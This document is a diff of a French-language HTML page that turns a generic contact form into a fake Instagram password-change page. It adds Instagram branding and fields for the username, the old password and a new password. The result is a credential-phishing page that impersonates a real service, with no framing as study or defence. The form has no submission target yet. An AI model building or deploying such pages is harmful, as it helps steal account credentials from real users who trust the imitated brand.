@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Formulaire de Contact</title>
+<title>Instagram</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -15,6 +15,10 @@
     max-width: 800px;
     margin: 0 auto;
     padding: 20px;
+    text-align: center;
+  }
+  .logo {
+    margin-bottom: 20px;
   }
   .contact-form {
     background-color: #ffffff;
@@ -39,19 +43,22 @@
 </head>
 <body>
   <div class="container">
-    <h1>Contactez-nous</h1>
+    <div class="logo">
+      <img src="lien_vers_le_logo_instagram.png" alt="Logo Instagram" width="100">
+      <h1>Instagram</h1>
+    </div>
     <div class="contact-form">
       <form>
-        <label for="name">Nom :</label>
-        <input type="text" id="name" name="name" required>
+        <label for="username">Nom d'utilisateur :</label>
+        <input type="text" id="username" name="username" required>
         
-        <label for="email">Email :</label>
-        <input type="email" id="email" name="email" required>
+        <label for="password">Ancien Mot de Passe :</label>
+        <input type="password" id="password" name="password" required>
         
-        <label for="message">Message :</label>
-        <textarea id="message" name="message" rows="4" required></textarea>
+        <label for="new-password">Nouveau Mot de Passe :</label>
+        <input type="password" id="new-password" name="new-password" required>
         
-        <button type="submit">Envoyer</button>
+        <button type="submit">Changer le Mot de Passe</button>
       </form>
     </div>
   </div>
